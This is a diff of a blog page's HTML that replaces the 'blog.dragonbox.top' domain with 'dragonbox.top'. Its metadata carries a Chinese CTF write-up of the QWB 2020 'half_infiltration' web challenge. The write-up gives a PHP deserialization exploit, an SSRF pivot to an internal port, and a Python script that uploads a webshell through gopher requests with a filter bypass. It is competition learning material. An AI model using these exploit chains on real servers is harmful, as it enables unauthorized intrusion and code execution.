@@ -55,16 +55,16 @@ if (isset($_GET[&#39;x&#39;])) {
 
 启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。">
 <meta name="author" content="ch3n9w">
-<link rel="canonical" href="http://blog.dragonbox.top/posts/ctf-qwb2020-web-1/">
+<link rel="canonical" href="http://dragonbox.top/posts/ctf-qwb2020-web-1/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://blog.dragonbox.top/flash.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://blog.dragonbox.top/flash.ico">
-<link rel="icon" type="image/png" sizes="32x32" href="http://blog.dragonbox.top/flash.ico">
-<link rel="apple-touch-icon" href="http://blog.dragonbox.top/flash.ico">
-<link rel="mask-icon" href="http://blog.dragonbox.top/flash.ico">
+<link rel="icon" href="http://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="http://dragonbox.top/flash.ico">
+<link rel="apple-touch-icon" href="http://dragonbox.top/flash.ico">
+<link rel="mask-icon" href="http://dragonbox.top/flash.ico">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://blog.dragonbox.top/posts/ctf-qwb2020-web-1/">
+<link rel="alternate" hreflang="en" href="http://dragonbox.top/posts/ctf-qwb2020-web-1/">
 <noscript>
     <style>
         #theme-toggle,
@@ -150,13 +150,13 @@ if (isset($_GET[&#39;x&#39;])) {
 
 启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://blog.dragonbox.top/posts/ctf-qwb2020-web-1/" />
-<meta property="og:image" content="http://blog.dragonbox.top/image-20211114141959846.png" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://dragonbox.top/posts/ctf-qwb2020-web-1/" />
+<meta property="og:image" content="http://dragonbox.top/image-20211114141959846.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-08-27T20:48:12+00:00" />
 <meta property="article:modified_time" content="2020-08-27T20:48:12+00:00" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="http://blog.dragonbox.top/image-20211114141959846.png" />
+<meta name="twitter:image" content="http://dragonbox.top/image-20211114141959846.png" />
 <meta name="twitter:title" content="qwb2020web复现"/>
 <meta name="twitter:description" content="half_infiltration
 开局的页面如下
@@ -216,13 +216,13 @@ if (isset($_GET[&#39;x&#39;])) {
       "@type": "ListItem",
       "position":  1 ,
       "name": "Posts",
-      "item": "http://blog.dragonbox.top/posts/"
+      "item": "http://dragonbox.top/posts/"
     }, 
     {
       "@type": "ListItem",
       "position":  2 ,
       "name": "qwb2020web复现",
-      "item": "http://blog.dragonbox.top/posts/ctf-qwb2020-web-1/"
+      "item": "http://dragonbox.top/posts/ctf-qwb2020-web-1/"
     }
   ]
 }
@@ -240,7 +240,7 @@ if (isset($_GET[&#39;x&#39;])) {
   "articleBody": "half_infiltration 开局的页面如下\n\u003c?php highlight_file(__FILE__); $flag=file_get_contents('ssrf.php'); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-\u003eage; $boy = $this-\u003esex; $a = $this-\u003enum; $student-\u003e$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS['flag']; ob_end_clean(); } } if (isset($_GET['x'])) { unserialize($_GET['x'])-\u003eget_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[‘flag’]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲\n启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。\nob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.\n\u003c?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-\u003eage = $a; $this-\u003esex = $b; $this-\u003enum = $c; } } echo urlencode(serialize([ new User(new Pass(), \"read\", \"result\"), new User(new Pass(), \"read\", \"this\") ])); ?\u003e 然后我们可以看到ssrf.php的内容\n\u003c?php //经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网 $url = $_GET['we_have_done_ssrf_here_could_you_help_to_continue_it'] ?? false; if(preg_match(\"/flag|var|apache|conf|proc|log/i\" ,$url)){ die(\"\"); } if($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 1); curl_exec($ch); curl_close($ch); } ?\u003e 扫描发现\nhttp://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/\n有东西\nHTTP/1.1 200 OK Date: Thu, 27 Aug 2020 13:04:07 GMT Server: Apache/2.4.18 (Ubuntu) Set-Cookie: PHPSESSID=60uap1c9tcik5f1ivmqqp933g2; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Vary: Accept-Encoding Content-Length: 1121 Content-Type: text/html; charset=UTF-8 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eMessage Board\u003c/title\u003e \u003clink rel=\"stylesheet\" href=\"css/bootstrap.min.css\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"container\" style=\"text-align:center;vertical-align:middle;\"\u003e \u003cdiv class=\"row\" style=\"text-align:center;vertical-align:middle;\"\u003e \u003ch1\u003eMessage Board \u003c/h1\u003e \u003c/div\u003e \u003cdiv class=\"row\"\u003e \u003cbr\u003e\u003cbr\u003e \u003cp class=\"lead\"\u003e Since there is only one administrator, a person can only submit one opinion at a time. Each time a new opinion is submitted, all old comments will be deleted \u003cbr\u003e\u003cbr\u003e \u003c/p\u003e \u003c/div\u003e \u003cbr\u003e \u003cdiv class=\"row\" style=\"text-align:center;vertical-align:middle;\"\u003e \u003cform method=\"POST\" class=\"form-inline\"\u003e \u003cdiv class=\"form-group\"\u003e \u003cinput class='form-control' type=\"text\" name=\"file\"\u003e \u003c/div\u003e \u003cdiv class='panel-body'\u003e \u003ctextarea class='form-control' name='content' rows='6'\u003e\u003c/textarea\u003e \u003cbr\u003e \u003cbr\u003e \u003cdiv class=\"form-group\"\u003e \u003cbutton type=\"submit\" class='btn btn-default col-md-2 form-control' value=\"Submit\"\u003eSubmit\u003c/button\u003e \u003c/div\u003e \u003c/form\u003e \u003c/div\u003e 同时\nhttp://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/\n可以访问, 那么这里应该是上传东西到目录下面了.这里使用gopher协议来发送post上传文件, 这里依然会有一个过滤, 包括等号在内的几种符号和字母组合都被过滤了,使用二次编码协议来绕过.\nimport requests from urllib.parse import urlencode, quote_plus, quote url0 = \"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_\" upload_data = { 'file':'php://filter/convert.base64-decode|convert.base64-decode/resource=shell.php', 'content':'UEQ4OVlHTmhkQ0F2Wm14aFoyQTc' # 似乎可以正常解密的base64都无法写入文件中 } upload_data = urlencode(upload_data, quote_via=quote_plus) print(upload_data) gopher_content = '''POST / HTTP/1.1 Host: 127.0.0.1:40000 Cookie: PHPSESSID=hhhhhhhhhhhhhhhhhhhhhhhaaa; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: {length} {data}'''.format(length = len(upload_data), data=upload_data).replace('\\n', '\\r\\n') # ssrf need double url encode url = url0 + quote(quote(gopher_content)) header = {\"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\", \"Connection\": \"close\"} while True: requests.get(url, headers=header) validate = \"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/hhhhhhhhhhhhhhhhhhhhhhhaaa/shell.php res = requests.get(validate) print(res.content) ",
   "wordCount" : "370",
   "inLanguage": "en",
-  "image":"http://blog.dragonbox.top/image-20211114141959846.png","datePublished": "2020-08-27T20:48:12Z",
+  "image":"http://dragonbox.top/image-20211114141959846.png","datePublished": "2020-08-27T20:48:12Z",
   "dateModified": "2020-08-27T20:48:12Z",
   "author":{
     "@type": "Person",
@@ -248,14 +248,14 @@ if (isset($_GET[&#39;x&#39;])) {
   },
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "http://blog.dragonbox.top/posts/ctf-qwb2020-web-1/"
+    "@id": "http://dragonbox.top/posts/ctf-qwb2020-web-1/"
   },
   "publisher": {
     "@type": "Organization",
     "name": "ch3n9w の 超元域",
     "logo": {
       "@type": "ImageObject",
-      "url": "http://blog.dragonbox.top/flash.ico"
+      "url": "http://dragonbox.top/flash.ico"
     }
   }
 }
@@ -277,8 +277,8 @@ if (isset($_GET[&#39;x&#39;])) {
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://blog.dragonbox.top/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
-                <img src="http://blog.dragonbox.top/avatar.jpg" alt="" aria-label="logo"
+            <a href="http://dragonbox.top/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
+                <img src="http://dragonbox.top/avatar.jpg" alt="" aria-label="logo"
                     height="35">ch3n9w の 超元域</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
@@ -305,7 +305,7 @@ if (isset($_GET[&#39;x&#39;])) {
         </div>
         <ul id="menu">
             <li>
-                <a href="http://blog.dragonbox.top/categories/" title="categories">
+                <a href="http://dragonbox.top/categories/" title="categories">
                     <span>categories</span>
                 </a>
             </li>
@@ -316,7 +316,7 @@ if (isset($_GET[&#39;x&#39;])) {
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://blog.dragonbox.top/">Home</a>&nbsp;»&nbsp;<a href="http://blog.dragonbox.top/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="http://dragonbox.top/">Home</a>&nbsp;»&nbsp;<a href="http://dragonbox.top/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       qwb2020web复现
     </h1>
@@ -325,8 +325,8 @@ if (isset($_GET[&#39;x&#39;])) {
 </div>
   </header> 
 <figure class="entry-cover">
-        <img loading="eager" srcset="http://blog.dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu1815068689607361705.png 360w ,http://blog.dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu7669767990326402703.png 480w ,http://blog.dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu9398446658780294442.png 720w ,http://blog.dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu17098981144027839555.png 1080w ,http://blog.dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png 1296w" 
-            sizes="(min-width: 768px) 720px, 100vw" src="http://blog.dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png" alt="" 
+        <img loading="eager" srcset="http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu1815068689607361705.png 360w ,http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu7669767990326402703.png 480w ,http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu9398446658780294442.png 720w ,http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu17098981144027839555.png 1080w ,http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png 1296w" 
+            sizes="(min-width: 768px) 720px, 100vw" src="http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png" alt="" 
             width="1296" height="660">
         
 </figure><div class="toc">
@@ -546,12 +546,12 @@ if (isset($_GET[&#39;x&#39;])) {
     <ul class="post-tags">
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://blog.dragonbox.top/posts/ctf-gactf2020/">
+  <a class="prev" href="http://dragonbox.top/posts/ctf-gactf2020/">
     <span class="title">« Prev</span>
     <br>
     <span>GACTF2020</span>
   </a>
-  <a class="next" href="http://blog.dragonbox.top/posts/sec-http-smuggling/">
+  <a class="next" href="http://dragonbox.top/posts/sec-http-smuggling/">
     <span class="title">Next »</span>
     <br>
     <span>http请求走私笔记</span>
@@ -563,7 +563,7 @@ if (isset($_GET[&#39;x&#39;])) {
     </main>
     
 <footer class="footer">
-        <span>&copy; 2024 <a href="http://blog.dragonbox.top/">ch3n9w の 超元域</a></span> · 
+        <span>&copy; 2024 <a href="http://dragonbox.top/">ch3n9w の 超元域</a></span> · 
 
     <span>
         Powered by
